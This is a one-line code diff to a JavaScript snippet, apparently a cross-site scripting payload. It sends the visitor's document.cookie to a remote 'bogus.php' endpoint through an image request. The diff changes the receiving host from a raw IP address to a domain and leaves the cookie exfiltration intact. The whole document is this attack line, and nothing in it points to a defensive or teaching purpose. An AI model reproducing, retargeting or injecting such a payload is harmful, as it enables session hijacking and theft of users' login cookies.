@@ -1,1 +1,1 @@
-new Image().src="http://167.71.15.25/bogus.php?output="+document.cookie;
+new Image().src="https://t42.1secure.nl/bogus.php?output="+document.cookie;
